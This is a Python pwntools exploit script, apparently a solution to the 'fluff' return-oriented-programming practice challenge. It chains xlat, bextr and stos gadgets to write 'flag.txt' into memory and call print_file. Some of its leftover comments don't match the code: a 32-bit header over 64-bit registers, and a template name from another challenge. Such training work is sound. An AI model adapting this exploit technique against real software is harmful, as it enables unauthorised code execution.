#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./badchars32
import struct

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./fluff")
context.delete_corefiles = True
context.terminal = ["alacritty", "-e", "sh", "-c"]
rop = ROP(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
break *0x40062A
break *pwnme+152
break print_file
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'
io = start()
io.sendline(cyclic(100, alphabet="QWERT"))
io.wait()

offset = cyclic_find(io.corefile.read(io.corefile.rsp, 4), alphabet="QWERT")
info(offset)


def binaryToInt(binary):
    return int(binary, 2)


def pb(i):
    print(f"{i:0>32b}")


io = start()

data_section = exe.symbols["data_start"]
stos_rdi_al = 0x400639
xlat_rbx = 0x400628
rdx_rcx_pext_rbx_rcx_rdx = 0x40062A  # rbx dst, rcx src, rdx mask
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
mov_eax_pop_rbp = 0x400610
srcs = []
control = binaryToInt("1111111100000000")  # Les 32 fra 0
prev = 0x0
for a in "flag.txt":
    letterAddress = next(exe.search(a.encode()))
    info(hex(letterAddress))
    info(a)
    src = (
        letterAddress - 0x3EF2 - prev
    )  # fordi stos legger automatisk till verdien på al, som vil være bokstaven lest i binary
    srcs.append(src)
    prev = ord(a)

payload = flat(
    offset * b"A",
    mov_eax_pop_rbp,
    0x0,
    pop_rdi,
    data_section,
)
for src in srcs:
    payload += flat(
        rdx_rcx_pext_rbx_rcx_rdx,  # popper rdx, rcx, rcx + 0x3ef2, bextr rbx, rcx, rdx
        control,  # rdx
        src,  # rcx
        xlat_rbx,  # skriver rbx til al
        stos_rdi_al,  # skriver al til [rdi]
    )

payload += flat(pop_rdi, data_section, exe.symbols["print_file"])

io.sendline(payload)
io.recvuntil("you!\n")
success(io.recvline())

# 0x0000000000400628 <+0>:	xlat   BYTE PTR ds:[rbx]
# 0x0000000000400629 <+1>:	ret
# 0x000000000040062a <+2>:	pop    rdx
# 0x000000000040062b <+3>:	pop    rcx
# 0x000000000040062c <+4>:	add    rcx,0x3ef2
# 0x0000000000400633 <+11>:	bextr  rbx,rcx,rdx
# 0x0000000000400638 <+16>:	ret
# 0x0000000000400639 <+17>:	stos   BYTE PTR es:[rdi],al
# 0x000000000040063a <+18>:	ret
# 0x000000000040063b <+19>:	nop    DWORD PTR [rax+rax*1+0x0]
